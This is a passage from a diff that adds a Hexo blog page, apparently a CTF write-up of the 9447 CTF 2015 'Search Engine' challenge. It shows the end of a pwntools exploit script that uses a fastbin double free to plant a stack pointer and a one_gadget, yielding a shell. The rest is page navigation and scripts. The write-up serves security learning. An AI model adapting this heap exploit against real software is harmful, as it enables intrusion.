index(<span class="string">'A'</span>*<span class="number">50</span>+<span class="string">' d'</span>)</span><br><span class="line">        index(<span class="string">'B'</span>*<span class="number">50</span>+<span class="string">' d'</span>)</span><br><span class="line">        index(<span class="string">'C'</span>*<span class="number">50</span>+<span class="string">' d'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#fastbin -&gt; A -&gt; B -&gt; C -&gt; NULL</span></span><br><span class="line">        search(<span class="string">'d'</span>)</span><br><span class="line">        delete(<span class="string">'y'</span>)</span><br><span class="line">        delete(<span class="string">'y'</span>)</span><br><span class="line">        delete(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#fastbin -&gt;B -&gt; A -&gt; B -&gt; C -&gt; NULL</span></span><br><span class="line">        search(<span class="string">'\x00'</span>)</span><br><span class="line">        delete(<span class="string">'y'</span>)</span><br><span class="line">        delete(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#fastbin -&gt;B -&gt; A -&gt; B -&gt; evil -&gt; ?</span></span><br><span class="line">        index(p64(stack).ljust(<span class="number">52</span>))</span><br><span class="line">        index(<span class="string">'A'</span>*<span class="number">50</span>+<span class="string">' d'</span>)</span><br><span class="line">        index(<span class="string">'A'</span>*<span class="number">50</span>+<span class="string">' d'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#put one_gadget on stack</span></span><br><span class="line">        one_gadget = libc + <span class="number">0x45216</span></span><br><span class="line">        log.info(<span class="string">'one_gadget: '</span>+ hex(one_gadget))</span><br><span class="line">        payload = <span class="string">'A'</span>*<span class="number">6</span> + p64(one_gadget)</span><br><span class="line">        index(payload.ljust(<span class="number">52</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">        stack = leak_stack() + <span class="number">0x92</span></span><br><span class="line">        libc = leak_libc()</span><br><span class="line">        double_free(stack,libc)</span><br><span class="line">        r.recvuntil(<span class="string">'Quit\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'3'</span>)</span><br><span class="line">        r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">        main()</span><br></pre></td></tr></table></figure>
+<p>参考： <strong><a href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/" target="_blank" rel="noopener">https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/</a></strong></p>
+<p><strong><a href="https://go-madhat.github.io/9447_heap_search-writeup/" target="_blank" rel="noopener">https://go-madhat.github.io/9447_heap_search-writeup/</a></strong></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/how2heap/" rel="tag"># how2heap</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/13/first-fit/" rel="next" title="first fit">
+                <i class="fa fa-chevron-left"></i> first fit
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/22/ciscn2019线上/" rel="prev" title="ciscn2019线上赛-pwn">
+                ciscn2019线上赛-pwn <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Muirelle</p>
+              <p class="site-description motion-element" itemprop="description">吾将上下而求索</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://firstkaixin.github.io/" title="Mrkaixin" target="_blank">Mrkaixin</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#fastbin"><span class="nav-number">1.</span> <span class="nav-text">fastbin</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">1.1.</span> <span class="nav-text">分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#9447-CTF-2015-Search-Engine"><span class="nav-number">2.</span> <span class="nav-text">9447 CTF 2015: Search Engine</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-1"><span class="nav-number">2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leak-stack"><span class="nav-number">2.2.</span> <span class="nav-text">leak_stack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leak-libc"><span class="nav-number">2.3.</span> <span class="nav-text">leak_libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#double-free"><span class="nav-number">2.4.</span> <span class="nav-text">double free</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit"><span class="nav-number">2.5.</span> <span class="nav-text">exploit</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Muirelle</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("K1WEvzezolboN84rQYlF0Dvv-gzGzoHsz", "KnwfedBiA348tAxLpapkotlB");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
